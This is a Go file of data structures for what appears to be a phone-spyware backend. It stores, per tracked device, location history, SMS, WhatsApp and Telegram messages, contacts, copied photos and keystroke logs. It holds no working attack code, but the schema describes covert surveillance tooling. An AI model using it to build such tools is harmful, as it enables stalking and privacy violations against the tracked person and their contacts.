package structs

type Administrator struct {
	ID       uint   `json:"id"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Person struct {
	ID           uint   `json:"id"`
	Imei         string `json:"imei"` 
	First_Name   string `json:"firstname"`
	Last_Name    string `json:"lastname"`
	Software_Ver string `json:"software_ver"`
	Phone_Number string `json:"phone_number"`
	Model_Number string `json:"model_number"`
	Model_Name   string `json:"model_name"`
	API          string `json:"api_auth"`
}

type Contact struct{
	ID           uint   `json:"id"`
	Imei         string `json:"imei"`
	First_Name   string `json:"firstname"`
	Last_Name    string `json:"lastname"`
	Phone_Number string `json:"phone_number"`
}

type GPS struct {
	ID          uint    `json:"id"`
	Imei        string  `json:"imei"`
	Street      string  `json:"street"`
	City        string  `json:"city"`
	CountryCode string  `json:"country_code"`
	Latitude    float64 `json:"latitude"`
	Longtitude  float64  `json:"longtitude"`
}

type GPSHistory struct {
	ID          uint    `json:"id"`
	Street      string  `json:"street"`
	City        string  `json:"city"`
	CountryCode string  `json:"country_code"`
	Latitude    float64 `json:"latitude"`
	Longtitude  float64  `json:"longtitude"`
	DateTime    uint64  `json:"date_time"`
}

type Message struct {
	ID          uint   `json:"id"`
	DateTime    uint64 `json:"date_time"`
	FromMe      bool   `json:"from_me"`
	PhoneNumber string `json:"phone_number"` //from the other or not the one that are being tracked
	TextMessage string `json:"text_message"`
	Imei        string `json:"imei"`
}

type Whatsapp struct {
	ID          uint   `json:"id"`
	DateTime    uint64 `json:"date_time"`
	PhoneNumber string `json:"phone_number"` //from the other or not the one that are being tracked
	Message 	string `json:"message"`
	Imei        string `json:"imei"`
}

type Telegram struct {
	ID          uint   `json:"id"`
	DateTime    uint64 `json:"date_time"`
	PhoneNumber string `json:"phone_number"` //from the other or not the one that are being tracked
	Message 	string `json:"message"`
	Imei        string `json:"imei"`
}

type Picture struct{
	ID 			uint   `json:"id"`
	DateTime    uint64 `json:"date_time"`
	PictureName	string `json:"picture_name"` //image name at server
	PicturePath	string `json:"picture_path"` //path image at server
	Origin		string `json:"origin"` //path and name at mobile phone
	Imei        string `json:"imei"`
}

type Keylog struct{
	ID 			uint   `json:"id"`
	DateTime    uint64 `json:"date_time"`
	Imei        string `json:"imei"`
	Key			string `json:"key"`
}
